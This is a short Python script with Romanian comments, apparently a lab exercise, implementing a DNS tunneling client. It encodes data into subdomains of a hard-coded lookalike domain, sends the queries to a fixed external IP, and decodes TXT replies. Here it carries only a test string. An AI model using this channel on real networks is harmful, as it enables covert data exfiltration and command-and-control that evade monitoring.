import socket
import base64
from dnslib import DNSRecord, DNSQuestion, QTYPE

# adresa ip a serverului dns
server = "141.147.63.189"
# domeniul care va fi gestionat de serverul dns
domain = "ciscorespa55.com"

# functie pentru a trimite o cerere dns si a primi un raspuns
def send_query(data):
    # codificam datele folosind base32 si inlocuim '=' cu '-'
    encoded_data = base64.b32encode(data).decode('utf-8').replace('=', '-')
    # cream numele de query folosind datele codificate si domeniul
    query_name = f"{encoded_data}.{domain}"

    # construim cererea dns pentru un record de tip txt
    question = DNSQuestion(query_name, QTYPE.TXT)
    request = DNSRecord(q=question)
    # trimitem cererea dns catre serverul specificat pe portul 53
    response = request.send(server, 53, tcp=False)
    # parsam raspunsul primit de la server
    reply = DNSRecord.parse(response)

    # extragem raspunsul de tip txt si convertim in string
    if reply.rr:
        answer = reply.rr[0].rdata
        decoded_answer = base64.b64decode(str(answer)).decode('utf-8')
        return decoded_answer
    return "No response"

# functie principala pentru a trimite o cerere si a afisa raspunsul
def main():
    # datele care vor fi trimise prin dns tunneling
    data = b"DNS tunnel from client."
    # trimitem cererea si primim raspunsul de la server
    response = send_query(data)
    # afisam raspunsul primit de la server
    print(f"Response from server: {response}")

# verificam daca scriptul este rulat direct
if __name__ == "__main__":
    main()
